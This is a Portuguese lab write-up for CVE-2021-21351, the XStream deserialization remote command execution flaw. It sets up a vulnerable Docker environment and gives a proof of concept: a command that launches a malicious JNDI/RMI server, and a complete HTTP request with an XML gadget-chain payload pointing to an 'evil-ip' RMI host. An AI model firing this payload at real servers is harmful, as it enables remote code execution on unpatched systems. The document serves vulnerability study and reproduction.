# XStream Deserialization Remote Command Execution (CVE-2021-21351)

XStream é uma biblioteca simples para serializar objetos para XML e vice-versa.

O XStream usa um mecanismo de lista de bloqueio ao analisar texto XML que é utilizado para se defender contra vulnerabilidades de desserialização, mas na versão 1.4.15 e anteriores, as listas de bloqueio estão incompletas e os invasores podem usar `javax.naming.ldap.Rdn$RdnEntry` e `javax.sql. rowset.BaseRowSet` para fazer uma injeção de JNDI e finalmente executar comandos arbitrários.

Links de referência:

- https://x-stream.github.io/CVE-2021-21351.html
- https://paper.seebug.org/1543/
- https://www.veracode.com/blog/research/exploiting-jndi-injections-java
- https://github.com/welk1n/JNDI-Injection-Exploit/

## Ambiente vulnerável

Inicie um servidor Springboot + XStream 1.4.15.

```
docker-compose up -d
```

Uma vez que o ambiente é iniciado, você pode enviar a seguinte solicitação para `http://your-ip:8080` para testar se o servidor foi iniciado com sucesso
![](1.png)

## Prova de Conceito

Como a versão Java de destino é superior a 8u191, você precisa da ajuda de `org.apache.naming.factory.BeanFactory` com injeção de expressão EL para executar comandos arbitrários, consulte [este artigo](https://www.veracode. com/blog/research/exploiting-jndi-injections-java).

Inicie um servidor JNDI malicioso usando [esta ferramenta](https://github.com/welk1n/JNDI-Injection-Exploit/).

```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "touch /tmp/success" -A 192.168.1.142
```

![](2.png)

Usando o endereço RMI baseado no gadget de exploração SpringBoot na captura de tela acima como o valor de `<dataSource>`.

```
POST / HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Content-Type: application/xml
Content-Length: 3184

<sorted-set>
  <javax.naming.ldap.Rdn_-RdnEntry>
    <type>ysomap</type>
    <value class='com.sun.org.apache.xpath.internal.objects.XRTreeFrag'>
      <m__DTMXRTreeFrag>
        <m__dtm class='com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM'>
          <m__size>-10086</m__size>
          <m__mgrDefault>
            <__overrideDefaultParser>false</__overrideDefaultParser>
            <m__incremental>false</m__incremental>
            <m__source__location>false</m__source__location>
            <m__dtms>
              <null/>
            </m__dtms>
            <m__defaultHandler/>
          </m__mgrDefault>
          <m__shouldStripWS>false</m__shouldStripWS>
          <m__indexing>false</m__indexing>
          <m__incrementalSAXSource class='com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces'>
            <fPullParserConfig class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'>
              <javax.sql.rowset.BaseRowSet>
                <default>
                  <concurrency>1008</concurrency>
                  <escapeProcessing>true</escapeProcessing>
                  <fetchDir>1000</fetchDir>
                  <fetchSize>0</fetchSize>
                  <isolation>2</isolation>
                  <maxFieldSize>0</maxFieldSize>
                  <maxRows>0</maxRows>
                  <queryTimeout>0</queryTimeout>
                  <readOnly>true</readOnly>
                  <rowSetType>1004</rowSetType>
                  <showDeleted>false</showDeleted>
                  <dataSource>rmi://evil-ip:1099/example</dataSource>
                  <listeners/>
                  <params/>
                </default>
              </javax.sql.rowset.BaseRowSet>
              <com.sun.rowset.JdbcRowSetImpl>
                <default/>
              </com.sun.rowset.JdbcRowSetImpl>
            </fPullParserConfig>
            <fConfigSetInput>
              <class>com.sun.rowset.JdbcRowSetImpl</class>
              <name>setAutoCommit</name>
              <parameter-types>
                <class>boolean</class>
              </parameter-types>
            </fConfigSetInput>
            <fConfigParse reference='../fConfigSetInput'/>
            <fParseInProgress>false</fParseInProgress>
          </m__incrementalSAXSource>
          <m__walker>
            <nextIsRaw>false</nextIsRaw>
          </m__walker>
          <m__endDocumentOccured>false</m__endDocumentOccured>
          <m__idAttributes/>
          <m__textPendingStart>-1</m__textPendingStart>
          <m__useSourceLocationProperty>false</m__useSourceLocationProperty>
          <m__pastFirstElement>false</m__pastFirstElement>
        </m__dtm>
        <m__dtmIdentity>1</m__dtmIdentity>
      </m__DTMXRTreeFrag>
      <m__dtmRoot>1</m__dtmRoot>
      <m__allowRelease>false</m__allowRelease>
    </value>
  </javax.naming.ldap.Rdn_-RdnEntry>
  <javax.naming.ldap.Rdn_-RdnEntry>
    <type>ysomap</type>
    <value class='com.sun.org.apache.xpath.internal.objects.XString'>
      <m__obj class='string'>test</m__obj>
    </value>
  </javax.naming.ldap.Rdn_-RdnEntry>
</sorted-set>
```

`evil-ip` é o endereço do servidor RMI malicioso. Pode-se ver que `touch /tmp/success` foi executado com sucesso:

![](3.png)

Se algo der errado com o POC e a versão Java, o POC deve ser modificado alterando `<__overrideDefaultParser>false</__overrideDefaultParser>` para `<__useServicesMechanism>false</__useServicesMechanism>`.
